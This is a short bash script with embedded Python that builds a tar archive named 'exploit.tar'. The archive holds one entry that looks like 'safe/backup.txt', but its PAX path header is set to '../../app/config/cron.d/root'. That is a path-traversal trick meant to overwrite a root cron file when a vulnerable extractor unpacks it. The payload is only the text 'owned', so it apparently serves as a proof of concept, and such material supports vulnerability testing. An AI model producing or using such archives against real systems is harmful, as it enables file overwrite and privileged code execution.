#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
export OUT_DIR
python3 - <<'INNER_PY'
import tarfile,io,os
from pathlib import Path
out=Path(os.environ['OUT_DIR'],'exploit.tar')
with tarfile.open(out,'w') as t:
    data=b'owned\n'
    m=tarfile.TarInfo('safe/backup.txt')
    m.size=len(data)
    m.pax_headers={'path':'../../app/config/cron.d/root'}
    t.addfile(m,io.BytesIO(data))
INNER_PY
